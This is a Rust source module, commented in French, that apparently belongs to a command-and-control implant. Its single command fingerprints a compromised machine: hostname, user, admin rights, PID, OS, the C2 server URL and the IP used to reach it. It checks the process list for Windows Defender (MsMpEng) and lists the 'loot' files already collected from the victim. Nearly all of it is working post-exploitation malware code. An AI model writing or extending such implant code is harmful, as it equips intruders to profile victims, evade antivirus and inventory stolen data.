// Empreinte et contexte de la cible en une commande.
use crate::hostinfo;
use crate::modules::loot;

pub fn run(_args: &str) -> String {
    let hostname = hostinfo::hostname();
    let username = hostinfo::username();
    let c2_host = crate::config::C2_URL
        .trim_start_matches("https://")
        .trim_start_matches("http://")
        .split(':')
        .next()
        .unwrap_or("?");

    let mut lines = vec![
        "== cible ==".to_string(),
        format!("hote        : {}", hostname),
        format!("utilisateur : {}", username),
        format!("admin       : {}", if hostinfo::elevated() { "oui" } else { "non" }),
        format!("pid         : {}", hostinfo::pid()),
        format!("systeme     : {} {}", std::env::consts::OS, std::env::consts::ARCH),
        format!("c2          : {}", crate::config::C2_URL),
        format!("ip          : {}", hostinfo::primary_ip(c2_host)),
        format!("av          : {}", defender_status()),
        "== collecte ==".to_string(),
    ];
    for entry in loot::inventory() {
        lines.push(format!("{:8}  {}", entry.category, entry.path));
    }
    lines.join("\n")
}

fn defender_status() -> &'static str {
    #[cfg(windows)]
    {
        if crate::modules::shell_builtin::ps()
            .to_lowercase()
            .contains("msmpeng")
        {
            return "Defender actif (MsMpEng)";
        }
        "MsMpEng absent"
    }
    #[cfg(not(windows))]
    "-"
}
